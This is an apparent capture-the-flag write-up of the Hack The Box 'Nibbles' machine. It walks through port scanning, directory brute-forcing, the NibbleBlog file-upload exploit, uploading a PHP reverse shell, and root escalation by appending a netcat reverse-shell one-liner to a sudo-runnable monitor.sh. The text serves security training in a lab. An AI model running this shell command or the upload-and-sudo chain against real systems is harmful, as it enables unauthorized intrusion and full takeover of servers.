1.How many open TCP ports are listening on nibbles?
First what we need to do is check what's happend on the server and how many ports are open.
We don't see nothing intresting, only some SSH and HTTP. Let's go dipper to find something more intresting.

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/f41ed141-e648-4f40-b5d2-ebc17c793eff)

2.What is the relative path on the webserver to a blog?
First what i did is go to website, but there is nothing intresting, only Hello world!
But when i check the source code i found <!-- /nibbleblog/ directory. Nothing interesting here! -->
This looks very intresting and this also the answer for as question :)

3.What content management system (CMS) is being used by the blog??
I check the source code but there is nothing intresting, i recommend to install extensions wallalyzer, this extension help mi figure out what kind of software running on the server, but in this situation, wapalyzer don't detect the CMS lol :P
Next my think is maybe to find some switch for nmap to detect the CMS. I found this --script=http-enum but still i don't have any idea what kind of CMS is this.
After few min, checking the webpage i found in right corner: Powered by nibbleblog, lol

4.What is the relative path to an XML file that contains the admin username?
I used feroxbuster, with this tool you can, forced browsing is an attack where the aim is to enumerate and access resources that are not referenced by the web application, but are still accessible by an attacker. feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories
I found this:

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/5d3e718a-289f-498e-9552-6ddeae9c8f2f)

5.What is the 2015 CVE ID for an authenticated code execution by file upload vulnerability in this version of NibbleBlog.
First our resource to find exploit is exploit-db, there no many exploit for NibbleBlog, but after few secend i found this.

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/b55c098e-3424-40e2-bff5-5b95ff34226b)

But i try also find this exploit on metasploit and here is the results: 0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
Now we need to insert all data to run this exploit.

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/3e5cdd2a-0351-4598-a820-facbf40523cf)

All like RHOST or LHOST i hope you have to know, what kind of value the need, but the TARGETURI is /nibbleblog/content/private/users.xml
But i have no idea why this exploit don't wanna run, i do some recon and i found how to do RCE by file upload. You need to go plugins/my_image and there you can use your reverse-shell.php, but remember before upload this image, change the ip, on your local. After ur upload go to nibbleblog/content/private/plugins/my_image/ and there you can find your reverse-shell

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/c4a4b6ea-3d75-4294-b844-ad34646fd11d)

6.Submit the flag located in the nibbler user's home directory.
You need to go into this directory and there you can find user.txt /home/nibbler

7.What is the name of the script that nibbler can run as root on Nibbles?
By command: sudo -l you can know, what kind of script nibbler can run as root, here is the results:
Now we know, this script name is monitor.sh

8.Submit the flag located in root's home directory.
It is easy to get you need to only write this command in your terminal: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 1337 >/tmp/f' | tee -a monitor.sh
Than you have access by root. Than write this sudo /home/nibbler/personal/stuff/monitor.sh and you got this, the root.

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/0fd73d4a-7b80-4aff-80c7-286c931650c3)

![obraz](https://github.com/Anogota/Nibbles/assets/143951834/febbccc3-9e94-47af-9bae-80a290a71b01)
